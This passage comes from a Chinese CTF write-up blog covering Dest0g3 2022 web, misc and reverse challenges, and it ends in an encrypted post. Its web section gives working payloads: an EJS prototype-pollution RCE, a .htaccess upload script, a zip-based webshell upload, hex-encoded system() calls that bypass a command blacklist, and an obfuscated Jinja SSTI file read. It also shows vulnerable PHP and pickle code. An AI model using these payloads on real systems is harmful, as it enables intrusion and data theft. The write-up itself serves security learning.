htaccess = &#123;&quot;file&quot;:(&#x27;.htaccess&#x27;,open(&#x27;.htaccess&#x27;,&#x27;rb&#x27;),&#x27;image/gif&#x27;)&#125;
r2 = requests.post(url=url,files=htaccess)
print(r2.text)</code></pre>
<p><img src="https://z4a.net/images/2022/05/22/imagecc54496892d1940d.png" alt="imagecc54496892d1940d.png"></p>
<p><img src="https://z4a.net/images/2022/05/22/image313cfbc40f7d8eb3.png" alt="image313cfbc40f7d8eb3.png"></p>
<p>蚁剑连接得到flag<img src="https://z4a.net/images/2022/05/22/image12377556ac0093eb.png" alt="image12377556ac0093eb.png"></p>
<p>Dest0g3{96ef2e3e-8975-4bb0-a30f-abe59fad6254}</p>
<p>(<a href="https://cloud.tencent.com/developer/article/1824057">Web安全｜.htaccess的奇淫技巧 - 云+社区 - 腾讯云 </a></p>
<h2 id="nodesoeasy">NodeSoEasy</h2>
<p><img src="https://z4a.net/images/2022/05/23/imagee1d1070f1c2b26d9.png" alt="imagee1d1070f1c2b26d9.png"></p>
<p>ejs原型链污染，使用这个payload进行rce</p>
<pre><code class="hljs plaintext">&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;);&quot;,&quot;compileDebug&quot;:true&#125;&#125;</code></pre>
<p>Dest0g3{2585dd0c-e9a7-460e-9ffa-98741629a297}</p>
<h2 id="ezip">ezip</h2>
<p><img src="https://z4a.net/images/2022/05/23/image8fcc57ab1fd75aad.png" alt="image8fcc57ab1fd75aad.png"></p>
<p>这个图片base64解码得到源码</p>
<pre><code class="hljs plaintext">upload.php:
&lt;?php
error_reporting(0);
include(&quot;zip.php&quot;);
if(isset($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]))&#123;
    if(strstr($_FILES[&#x27;file&#x27;][&#x27;name&#x27;],&quot;..&quot;)||strstr($_FILES[&#x27;file&#x27;][&#x27;name&#x27;],&quot;/&quot;))&#123;
        echo &quot;hacker!!&quot;;
        exit;
    &#125;
    if(pathinfo($_FILES[&#x27;file&#x27;][&#x27;name&#x27;], PATHINFO_EXTENSION)!=&quot;zip&quot;)&#123;
        echo &quot;only zip!!&quot;;
        exit;
    &#125;
    $Myzip = new zip($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);
    mkdir($Myzip-&gt;path);
    move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], &#x27;./&#x27;.$Myzip-&gt;path.&#x27;/&#x27; . $_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);
    echo &quot;Try to unzip your zip to /&quot;.$Myzip-&gt;path.&quot;&lt;br&gt;&quot;;
    if($Myzip-&gt;unzip())&#123;echo &quot;Success&quot;;&#125;else&#123;echo &quot;failed&quot;;&#125;
&#125;

zip.php:
&lt;?php
class zip
&#123;
    public $zip_name;
    public $path;
    public $zip_manager;

    public function __construct($zip_name)&#123;
        $this-&gt;zip_manager = new ZipArchive();
        $this-&gt;path = $this-&gt;gen_path();
        $this-&gt;zip_name = $zip_name;
    &#125;
    public function gen_path()&#123;
        $chars=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;;
        $newchars=str_split($chars);
        shuffle($newchars);
        $chars_key=array_rand($newchars,15);
        $fnstr = &quot;&quot;;
        for($i=0;$i&lt;15;$i++)&#123;
            $fnstr.=$newchars[$chars_key[$i]];
        &#125;
        return md5($fnstr.time().microtime()*100000);
    &#125;

    public function deldir($dir) &#123;
        //先删除目录下的文件：
        $dh = opendir($dir);
        while ($file = readdir($dh)) &#123;
            if($file != &quot;.&quot; &amp;&amp; $file!=&quot;..&quot;) &#123;
                $fullpath = $dir.&quot;/&quot;.$file;
                if(!is_dir($fullpath)) &#123;
                    unlink($fullpath);
                &#125; else &#123;
                    $this-&gt;deldir($fullpath);
                &#125;
            &#125;
        &#125;
        closedir($dh);
    &#125;
    function dir_list($directory)
    &#123;
        $array = [];

        $dir = dir($directory);
        while ($file = $dir-&gt;read()) &#123;
            if ($file !== &#x27;.&#x27; &amp;&amp; $file !== &#x27;..&#x27;) &#123;
                $array[] = $file;
            &#125;
        &#125;
        return $array;
    &#125;
    public function unzip()
    &#123;
        $fullpath = &quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$this-&gt;zip_name;
        $white_list = [&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;,&#x27;bmp&#x27;];
        $this-&gt;zip_manager-&gt;open($fullpath);
        for ($i = 0;$i &lt; $this-&gt;zip_manager-&gt;count();$i ++) &#123;
            if (strstr($this-&gt;zip_manager-&gt;getNameIndex($i),&quot;../&quot;))&#123;
                echo &quot;you bad bad&quot;;
                return false;
            &#125;
        &#125;
        if(!$this-&gt;zip_manager-&gt;extractTo($this-&gt;path))&#123;
            echo &quot;Unzip to /&quot;.$this-&gt;path.&quot;/ failed&quot;;
            exit;
        &#125;
        @unlink($fullpath);
        $file_list = $this-&gt;dir_list(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;);
        for($i=0;$i&lt;sizeof($file_list);$i++)&#123;
            if(is_dir($this-&gt;path.&quot;/&quot;.$file_list[$i]))&#123;
                echo &quot;dir? I deleted all things in it&quot;.&quot;&lt;br&gt;&quot;;@$this-&gt;deldir(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$file_list[$i]);@rmdir(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$file_list[$i]);
            &#125;
            else&#123;
                if(!in_array(pathinfo($file_list[$i], PATHINFO_EXTENSION),$white_list)) &#123;echo &quot;only image!!! I deleted it for you&quot;.&quot;&lt;br&gt;&quot;;@unlink(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$file_list[$i]);&#125;
            &#125;
        &#125;
        return true;

    &#125;


&#125;</code></pre>
<p>分析之后得知用了ziparchive，而这个漏洞导致解压失败从而中断解压，导致shell文件遗留没有被删除。</p>
<p>上传一个只解压一半的压缩包，让其webshell残留其中，方法放这一下<img src="https://z4a.net/images/2022/05/23/BDB747B0FFC74243F8B1D81279240EC0.jpg" alt="BDB747B0FFC74243F8B1D81279240EC0.jpg"></p>
<p>制作成功后上传，出现解压失败，其实是第二个txt文本解压失败，第一个php文件已经解压<img src="https://z4a.net/images/2022/05/23/imagecad31d833c3ed600.png" alt="imagecad31d833c3ed600.png"></p>
<p>然后访问1.php，发现存在并可以执行命令</p>
<pre><code class="hljs plaintext">1=phpinfo();</code></pre>
<p><img src="https://z4a.net/images/2022/05/23/image0dcc98e5da21bb82.png" alt="image0dcc98e5da21bb82.png"></p>
<p>但是执行<code>cat /flag</code>发现不能正常显示，这个很搞心态</p>
<p>使用nl得到flag</p>
<pre><code class="hljs plaintext">1=system(&#x27;nl /flag&#x27;);</code></pre>
<p><img src="https://z4a.net/images/2022/05/23/image2260af11ed3f6d39.png" alt="image2260af11ed3f6d39.png"></p>
<p>Dest0g3{fd6b15a2-7ae4-4666-8854-eafbf67d9d4c}</p>
<p><a href="https://developer.aliyun.com/article/243764">Linux下nl命令的用法详解</a></p>
<h2 id="simplerce">SimpleRCE</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-variable">$aaa</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;aaa&#x27;</span>];
<span class="hljs-variable">$black_list</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;^&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;`&#x27;</span>,<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;&lt;&#x27;</span>,<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;preg&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-string">&#x27;%0&#x27;</span>,<span class="hljs-string">&#x27;popen&#x27;</span>,<span class="hljs-string">&#x27;char&#x27;</span>,<span class="hljs-string">&#x27;decode&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;md5&#x27;</span>,<span class="hljs-string">&#x27;&#123;&#x27;</span>,<span class="hljs-string">&#x27;&#125;&#x27;</span>,<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-string">&#x27;get&#x27;</span>,<span class="hljs-string">&#x27;file&#x27;</span>,<span class="hljs-string">&#x27;ascii&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;replace&#x27;</span>,<span class="hljs-string">&#x27;assert&#x27;</span>,<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-string">&#x27;$&#x27;</span>,<span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;var&#x27;</span>,<span class="hljs-string">&#x27;pastre&#x27;</span>,<span class="hljs-string">&#x27;print&#x27;</span>,<span class="hljs-string">&#x27;tail&#x27;</span>,<span class="hljs-string">&#x27;sed&#x27;</span>,<span class="hljs-string">&#x27;pcre&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;scan&#x27;</span>,<span class="hljs-string">&#x27;decode&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;func&#x27;</span>,<span class="hljs-string">&#x27;diff&#x27;</span>,<span class="hljs-string">&#x27;ini_&#x27;</span>,<span class="hljs-string">&#x27;passthru&#x27;</span>,<span class="hljs-string">&#x27;pcntl&#x27;</span>,<span class="hljs-string">&#x27;proc_open&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;cat&#x27;</span>,<span class="hljs-string">&#x27;tac&#x27;</span>,<span class="hljs-string">&#x27;more&#x27;</span>,<span class="hljs-string">&#x27;sort&#x27;</span>,<span class="hljs-string">&#x27;log&#x27;</span>,<span class="hljs-string">&#x27;current&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;cut&#x27;</span>,<span class="hljs-string">&#x27;bash&#x27;</span>,<span class="hljs-string">&#x27;nl&#x27;</span>,<span class="hljs-string">&#x27;wget&#x27;</span>,<span class="hljs-string">&#x27;vi&#x27;</span>,<span class="hljs-string">&#x27;grep&#x27;</span>);
<span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-string">&quot;hacker&quot;</span>,<span class="hljs-variable">$aaa</span>);
<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$aaa</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>过滤了很多直接转hex使用</p>
<pre><code class="hljs plaintext">aaa=system(&#x27;cat /flag&#x27;);</code></pre>
<pre><code class="hljs plaintext">aaa=hex2bin(&#x27;73797374656d&#x27;)(hex2bin(&#x27;636174202f666c6167&#x27;));</code></pre>
<p><img src="https://z4a.net/images/2022/06/06/image16af3e85af1ece45.png" alt="image16af3e85af1ece45.png"></p>
<p>Dest0g3{72e99bdb-f94a-4b88-b09a-61273581a0d5}</p>
<h2 id="easyssti">EasySSTI</h2>
<ul>
<li>
<p>SSTI</p>
</li>
<li>
<p>黑名单过滤</p>
<p><img src="https://z4a.net/images/2022/06/07/image4f1dd930ab4766b8.png" alt="image4f1dd930ab4766b8.png"></p>
</li>
</ul>
<p><img src="https://z4a.net/images/2022/06/06/imagea335695e2816a229.png" alt="imagea335695e2816a229.png"></p>
<p>但是在测试的过程中发现过滤了很多东西，看了网上的复现过程，是需要通过fuzz获取过滤的字符，最后的payload粘贴一下吧，我还是太菜，这题我还是做不上来，多学学，希望有一天能自己写出来这样的题。</p>
<pre><code class="hljs plaintext">username=&#123;%set%0aa=dict(po=aa,p=aa)|join%&#125;&#123;%set%0ab=(lipsum|string|list)|attr(a)(18)%&#125;&#123;%set%0ac=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125;&#123;%set%0ad=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%&#125;&#123;%set%0ae=dict(o=cc,s=aa)|join%&#125;&#123;%set%0af=(lipsum|string|list)|attr(a)(9)%&#125;&#123;%set%0ag=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-8)%&#125;&#123;%set%0ai=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%&#125;&#123;%set%0aj=dict(po=cc,pen=aa)|join%&#125;&#123;%set%0ak=dict(re=cc,ad=aa)|join%&#125;&#123;&#123;((lipsum|attr(c))|attr(d)(e))|attr(j)(i)|attr(k)()&#125;&#125;&amp;password=aaa</code></pre>
<p><img src="https://z4a.net/images/2022/06/06/image8755147a7f9054b1.png" alt="image8755147a7f9054b1.png"></p>
<p>Dest0g3{cf3f4f5d-e185-4601-9230-43467f20ca2e}</p>
<h2 id="middle">middle</h2>
<ul>
<li>
<p><strong>pickle</strong>反序列化</p>
<pre><code class="hljs plaintext">import os
import config
from flask import Flask, request, session, render_template, url_for,redirect,make_response
import pickle
import io
import sys
import base64


app = Flask(__name__)


class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module in [&#x27;config&#x27;] and &quot;__&quot; not in name:
            return getattr(sys.modules[module], name)
        raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))


def restricted_loads(s):
    return RestrictedUnpickler(io.BytesIO(s)).load()

@app.route(&#x27;/&#x27;)
def show():
    base_dir = os.path.dirname(__file__)
    resp = make_response(open(os.path.join(base_dir, __file__)).read()+open(os.path.join(base_dir, &quot;config/__init__.py&quot;)).read())
    resp.headers[&quot;Content-type&quot;] = &quot;text/plain;charset=UTF-8&quot;
    return resp

@app.route(&#x27;/home&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])
def home():
    data=request.form[&#x27;data&#x27;]
    User = restricted_loads(base64.b64decode(data))
    return str(User)

if __name__ == &#x27;__main__&#x27;:
    app.run(host=&#x27;0.0.0.0&#x27;, debug=True, port=5000)
import os
def backdoor(cmd):
    # 这里我也改了一下
    if isinstance(cmd,list) :
        s=&#x27;&#x27;.join(cmd)
        print(&quot;!!!!!!!!!!&quot;)
        s=eval(s)
        return s
    else:
        print(&quot;??????&quot;)</code></pre>
</li>
</ul>
<h1 id="misc">misc</h1>
<h2 id="welcome-to-fxxking-destctf">Welcome to fxxking DestCTF</h2>
<p>下载附件，拉到stegsolve中，扫码关注得到flag</p>
<p>Dest0g3{W31c0m3_t0_DestCTF2022!}</p>
<h2 id="pngenius">Pngenius</h2>
<p>附件一个图片，binwalk分离flag压缩包，需要密码，图片拉到stegsolve，lsb，得到压缩包密码<img src="https://z4a.net/images/2022/05/22/image7f0164f02c7f482b.png" alt="image7f0164f02c7f482b.png"></p>
<p>解压得到flag</p>
<p><img src="https://z4a.net/images/2022/05/22/imagebc4fc4faa6d0a108.png" alt="imagebc4fc4faa6d0a108.png"></p>
<h2 id="easyencode">EasyEncode</h2>
<p>压缩包附件爆破得到密码<img src="https://z4a.net/images/2022/05/31/image0564b47f0a0aca4f.png" alt="image0564b47f0a0aca4f.png"></p>
<p>得到摩斯密码<img src="https://z4a.net/images/2022/05/31/image1930d4c54f7045d5.png" alt="image1930d4c54f7045d5.png"></p>
<p>解密得到十六进制</p>
<pre><code class="hljs plaintext">5C75303035325C75303034375C75303035365C75303037615C75303036345C75303034345C75303034325C75303036655C75303034645C75303033335C75303037345C75303034355C75303035615C75303035375C75303033395C75303036625C75303036315C75303035375C75303033355C75303036655C75303035385C75303037615C75303034365C75303037615C75303035385C75303033325C75303035355C75303033305C75303036335C75303033335C75303036635C75303036365C75303034655C75303034365C75303033395C75303035365C75303036365C75303035315C75303032355C75303033335C75303034345C75303032355C75303033335C7530303434</code></pre>
<p>再解密转字符串</p>
<pre><code class="hljs plaintext">\u0052\u0047\u0056\u007a\u0064\u0044\u0042\u006e\u004d\u0033\u0074\u0045\u005a\u0057\u0039\u006b\u0061\u0057\u0035\u006e\u0058\u007a\u0046\u007a\u0058\u0032\u0055\u0030\u0063\u0033\u006c\u0066\u004e\u0046\u0039\u0056\u0066\u0051\u0025\u0033\u0044\u0025\u0033\u0044</code></pre>
<p>再解密得到base64</p>
<pre><code class="hljs plaintext">RGVzdDBnM3tEZW9kaW5nXzFzX2U0c3lfNF9VfQ==</code></pre>
<p>再解密得到flag</p>
<pre><code class="hljs plaintext">Dest0g3&#123;Deoding_1s_e4sy_4_U&#125;</code></pre>
<h2 id="你知道js吗">你知道js吗</h2>
<p>附件拉到010里面是压缩包，解压一下<img src="https://z4a.net/images/2022/05/31/image3658a0171e36e731.png" alt="image3658a0171e36e731.png"></p>
<p>审计之后发现有一段base64加密的<img src="https://z4a.net/images/2022/05/31/image79cc68d36c0c05f0.png" alt="image79cc68d36c0c05f0.png"></p>
<p>解码之后得到</p>
<pre><code class="hljs plaintext">&lt;html&gt;\n&lt;body&gt;\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Do You Know js&lt;/title&gt;\n&lt;HTA:APPLICATION\n  APPLICATIONNA
ME=&quot;Do You Know js&quot;\n  ID=&quot;Inception&quot;\n  VERSION=&quot;1.0&quot;\n  SCROLL=&quot;no&quot;/&gt;\n \n&lt;style type=&quot;text/css&quot;&gt;\n&lt;/head&gt;\n    &lt;div i
d=&quot;feature&quot;&gt;\n            &lt;div id=&quot;content\n\t\t\t\t&lt;/style&gt;\n                &lt;h1 id=&quot;unavailable&quot; class=&quot;loading&quot;&gt;Build
ing js.....&lt;/h1&gt;\n\t\t\t\t&lt;script type=&quot;text/javascript&quot; language=&quot;javascript&quot;&gt;\n\t\t\t\t\tfunction RunFile() &#123;\n
   var WshShell = new ActiveXObject(&quot;WScript.Shell&quot;);\n\t\t\t\t\tWshShell.Run(&quot;notepad %windir%/Desktop/js.txt&quot;, 1, fals
e);\n          /* var oExec = WshShell.Exec(&quot;notepad&quot;); */\n\t\t\t\t\t&#125;\n\t\t\t\t&lt;/script&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n
&lt;body&gt;\n\t&lt;input type=&quot;button&quot; value=&quot;Implant Inception Here&quot; onclick=&quot;RunFile();&quot;/&gt;\n\t&lt;p style=&quot;color:white;&quot;&gt;\n\n++++
+ ++[-&gt; +++++ ++&lt;]&gt; +++.. ++.-. ++.-- --.++ ++.-- \n-.-.- --.++ ++++.\n+.--- -..++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++.&lt; +++[- \n&gt;---&lt;
 ]&gt;--- ---.+ ++++. -----\n.+++. ...-- ---.+ ++++. ---.+ ++.-- ---.+ ++++. ---.. +++++ +.--- ----.\n&lt;++++ [-&gt;++ ++&lt;]&gt; ++.
&lt;+ +++[- &gt;---- &lt;]&gt;-. ---.+\n +++++ .---- -.++. ++.+.\n--.-- .&lt;+++ +[-&gt;+ +++&lt;] &gt;++.&lt; ++++[ -&gt;--- -&lt;]&gt;- \n.+.-. ---.+ ++.+
. -.+++\n+.--- --.&lt;+ +++[- &gt;++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. ----. +.+++ +.---\n-.--- .+++. -..&lt;+ +++[- &gt;++++ &lt;]&gt;++ \n
.&lt;+++ +[-&gt;- ---&lt;] &gt;-.++ +++.- ----.\n+++.. ---.+ ++.-- --.+. ..+++ +.-.- ----. +++++ \n.---- .+.++ ++.-- --.++\n++.-. --
--. +.-.+ ++++. \n&lt;+++[ -&gt;+++ &lt;]&gt;++ ++.&lt;\n&lt;/p&gt;\n&lt;/body&gt;\n&lt;/body&gt;\n</code></pre>
<p>中间那段只是BrainFuck的OOK加密，解码得到十六进制字符串</p>
<pre><code class="hljs plaintext">446573743067337B38366661636163392D306135642D343034372D623730322D3836636233376162373762327D</code></pre>
<p>转字符得到flag</p>
<pre><code class="hljs plaintext">Dest0g3&#123;86facac9-0a5d-4047-b702-86cb37ab77b2&#125;</code></pre>
<h2 id="strangetraffic">StrangeTraffic</h2>
<p>追踪Modbus流得到<code>RGVzdDBnM3szMUE1QkVBNi1GMjBELUYxOEEtRThFQS0yOUI0RjI1NzEwOEJ9</code>，解码后得到flag</p>
<pre><code class="hljs plaintext">Dest0g3&#123;31A5BEA6-F20D-F18A-E8EA-29B4F257108B&#125;</code></pre>
<h1 id="re">re</h1>
<h2 id="simplexor">simpleXOR</h2>
<p>F5反编译分析代码，简单逆向一下，追踪result_0[j]</p>
<p><img src="https://z4a.net/images/2022/05/23/image11466966ac38a160.png" alt="image11466966ac38a160.png"></p>
<p>十六进制转十进制</p>
<p><img src="https://z4a.net/images/2022/05/23/image41ba28f658361e1e.png" alt="image41ba28f658361e1e.png"></p>
<pre><code class="hljs plaintext">a=[179,145,130,128,195,155,206,117,207,156,154,133,133,205,184,132,170,125,189,187,177,181,150,113,141,158,134,191,115,168,163,156,131,101,158,87]
flag=&#x27;&#x27;
for i in range(36):
    flag+=chr((a[i]^247)-i)
print(flag)</code></pre>
<p><img src="https://z4a.net/images/2022/05/23/imagefc1fa25c534a8ea1.png" alt="imagefc1fa25c534a8ea1.png"></p>
<p>Dest0g3{0bcgf-AdMy892-KobPW-hB6LTqG}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>1</title>
    <url>/2022/02/01/684/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不用试了，不想让你们看到的内容" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="c5f1bb7b733771da8884acb097e7e8d1aad0ebbd6c479005d674a387f17fca02">e193b7da6974138b72d647aedbe6899d32e61e7d3e6c2c9f8a014c38e7a73bb2731566757d740b6326899965116db817c86ac0a1d7c014a820d4eed1a505f9cde0b4c99a97f91cb781367bae9c884ca47fb8e4fb606a0bac0ac55c72f9da12517618f09d8f6a5c33c47ec72ed6fdb354c144995c76ec70224e894b02e709e12baeed7ebbe91bc8794b7364d75dd0d771907f88bbb4e827bc9bd5699f29716d5d46272c4558b7485ef213c350b7e05a4cf08d41cdebcfb36bf47c3573c4583180fa2af566893b189662cd1b16c4b37b7a0a7c784691efebc93e619c5a5678fe0955e5f6da87194b00244f85011fcb72e7758cd5777369e7921158f267225f3643f9ac849ccdf490922254c2a7237c830cc270da038d1c6804d620cb4ef2c7fb5a98c0a1d6f7d5327ac08fcf5d63c7c8852eef590ea37fff72cb9f9b3168e0af2e0b483ad12988767d017f171c278b42aa255a8b4d282e260e67c2b3822044fd3cb12513df57ece6a4a02c4811b52ca5d88147121d244260135808685d04793fe68d07e24b45b2e22369479afb4750a76abea286eb15991442152cfa4a62d424552955059bef414e03f3d9baf9f585b5a970cbe877e008942f498b2829b188f52d9682f7ce4da3afe0891f0a429cebfec629c2348bccf20ec87ad148f2e4d07acf0b972d9bbe7a4d0e7828008b39b7c457e0c1db49f1162fa64c5cf1ce1f67ec4f87c3c991ad6f57ed06b6d82ea2ab3b2502cb475a27317a484f49f01c739340854f62dbefb1e6c772e36b7b7b459b83ff373b3d59451c4435887267d932fe7f022afecd5cbc0affbfb72ec660cae8c03e1d12fd61d50128bbe699859bf9045d16b37bb1dc73a9010d18f30ebd9b8bf386903cc98b2c192237b88d76b4e3bb4061f47f3f9fdf80d4f58891e3034fc22a3132a53eb590ebf42ebad432111d75683a33eef4a4ae64747be5b14ac60287013214678aa30f539692b462c12b7f55aee20d5a68ab97d8ebbaac40a10b47a37dea55dd8d170c255fb6b67a6a090c64280a7497cda8be46a0512af369f22f14b5fd5120e9e84b52f4aff853bb539dcc03822b62a79d1f3a50489b386b80f568ab796d3114289481f7684f6a6f7dc54d597c9b8973b288adcabf4323f212ea19b6607d1d128f4d1180133e33a0b8a4a9ef474fe9bdae0cb690b7bccc7e95711aa9332fb94554e844e01ca6eba2fe5771fb650b654b3ce9a89933fc6ed11ccd383f580ac39e859f2e8d364ba9e987e9425b58ae0858f2597ce9b06a4c845e2209a11d80f05815f64abcb123e528a9cec07ad33bc2be9eb6041dd20cd223c1442f4f6d3d22381f5659c9a66afca65cd791575141d249f45f35f0968ab7c887727ed5ed1043a464bd046348a3a7240a7a47593bc1a729b22df38e09ccbc6cc23bb931e17116675df34b8ec8a6051a99061eb470eb4216572d090ec17b1e5db63bac64ac4df69e14c736a5cfdf0c428d550b9c37ab28c0f0a80458db0b931e027dc43a696bb052f1351009c49d591f957cdd12897d2bda88de4f45c66cc074fdddf795807d639ea77c6ea4c8731e0f82b826766a0dc29b9a0f8e0c68625fa134595df2595bd5a0225edefa589a231392d9a5cf42bd08d8703827af61f9337f6d8e1d825b116d2fa88e629849c37b44ac2842ab8d568544361849b669f284b36458ff8f8b88a431c52792c9c7f5a9d7d2af80995f9a403582830fa75f45085eac6ef27c3a89332716e69e5831ea3d126d4bff5bff658dc0a32b120c83ef234dd7a560d82093742dbfa3cbecd8a010e2dd035780ec15eb2e0c1dcb67892ebaca8d1a007313bcdd0867ebdf424a990da8723352ab4115a37901f30033a80dc565a91bf58c25ac728701bc4806a7832fafd9fbdd4d7bfe7fb6ea2671f3af6e3f947184f266c7b030738a8fd609ff5d85e13279966d0b04ab78d9d0167b0e0d99890a75aed36cf65360ddfff0ed6aa38fdc0f4ad3e3e4c3220c4bff8b7a958dbe3c7c3702455c26cab18bb11bc505be13024cf54ceac0d3b7ad49d34de3479892a0f14f0c3d47187dc9d69c6a07dab1149f47e90a0fc9106ad7ebd8a5bebbb3348ca490c675519f1b6104c10c7a6a6777383a642cae48193f6cf2bf664653073274fe4f118d6cb335d21a9ce1e5d560f7b6fb93f57078afefbd4a8f5486754306502063ff47e57863a0f51a46b6d196f0e26ae710a4d4e17d4e33d4f99b488d61daf8cd53ae9eb5206e23c57ff1b4a01af62f5adb2ef4ee10cb4b5f768647c58c0465a6e6c2412d1b8b8e07f13f415bd38044a94088073790773258f8c146b879cb43592a6c8987920ee84cf8a344eb1c4c771711d0b1f6ccab57c416230ff2565e56ca6cc9c648e27b1647b28b5b0c54102b754adf6e7007aca8b5d4a05cb397d2d46953832611d71450a11ea88611d3b3ab27ec6f022796fa99b071a8bce65972901f6e4fbb02cbed67e62b0991dfb6bb4ab1ac3129c2a3a7c0aea9efba4155f4ec6c19ac8f362d33d3f634361d8af8ee94a98cf368854830203f552730130730d282e741b4f758da94e735a3e2f3041d0ca50c868b3a864d286fc40d836f6c2dcddef638c3a34b2d738e1a0c3ef819616a5f441b59fdbc6f975ccad2f20e7e73f90476edbd430afadf721a5cba10d5ec3bb802d2e97b36e578aab465d546229262cb4952c65a85382104e525548f5e10b0b3545af4a5d17ae4f2e4b06987d18cbf2fe2cadddcc6863d7b37e4033354a648e49db0084f96a821c133c47eb8bf1f77f36af1719fb6d26fc416da5e4b5d05ac6499f448d56c22615d111abafcf03e48e2af6f84b5da7cad6f49a00aec3737b206467e607bd16af1adbdc4986bcb4106d1f2625ccfeddf8f8353887d7c0e5a79f8d77e5e74c0f8400cc19bcf3a1639ca69a870ca546b04ada97d408b4697a54820f6b602106d6d90c2b42457a6c40e97909878c630ae135d20096114861db53b50f2f01a2e6877fca5f72bb4a4f8f1831d38564377a222d568e51ae06b1cd854c56f306134e29d6100d8abf91e14f6106d2c802cffe73bce1d13a613bf08a2c771b5df8a93fa3f4ecfc7dde41c6b6b92d59c8cf07a78d9623280ba1569f6e759a731a68cffae50889a6ff1ed04c7ce95c424911dadc6eed1f47b54b76884173576170252e78cfc89cfb420b4f82fd27d009429c0de539271173853333dfc294400bf2709307a79c974ee5decad2147f82a47cf21bbe7e639eaafbf9fda34560f6b9af80963ba51a5fd159c3a07098fca9811cb892247f1cfcce996d7ed1c7d18e06e5745406c276810956b7760f72149de6bc9b4b40f43d2c3cff557e3475b7faf5a01ee160110d1e3af1df98df4cff05771bc4a6c3726135273dfc694baa486171736f8ca6fecffdf04311f700b502e7cb6c20bc4925dd840d56e6373d08039b82ec7861459cae4109afd230d63d1ee2056f68c6a4202132622f5ffd9f9aad6996a39af9d0ef49f719c90a65e7d271a31333e0a7916d9ffc206a672496f1f0a8050a6323cfbd95569b941c8c0b4f4698639176fb80557d0d38991de723b1fc1bbb7bb9ad67fe35a29b537f8e716f28c5522cb25a169b9f42b36da2af3846673963696bcea15157fae1f8f330aa99ebf44b5c0935ee8a698ddbb9eac2815631774bba60dc7a9604c57e2dd2e4401c4fc0726adb2a7ec903a07cfc9abd8573a394c392e4d6cc6f88b804ca5667de460a2c7b81404130417a06df72c3d9cd9cb8da14fd3ff69cedce0ba19f6d57d875d8cf59dc8fe74bb809b44d54b42ebc250f36912ebf36bf3f9fd6dcfc21aa0aa29bd459372673e6ab2cd7cccdb9051b9176970e18f3cf578645352453e1a5b4fe316adc6d57c202a89eafec5edeae548bb2f1cc3454788279c9b2b2eea04fb14def8f83c2e616354ea71d931579a6d2a46ef9d8e26b190d27ae1a90f269af66bbc1fbc0d5c05f271b8e3fb8ab7af5ebea87adde042a18d5577f3e95d415f0c862493c68442bd685762f8fc268f772da5eb9020e4dacbc028e0eb738178ab5637a3d6ca8fe664701bac62867ec9767afc35f475c1c9ebc60997a3214a4dc018ab80f4bad1d6dcbf8913c92ec83032ce036aeea55a85aa3391be7b3d3cf96a7e2fc3b312fe05fb11bfdeb3a6750229009b2b12614a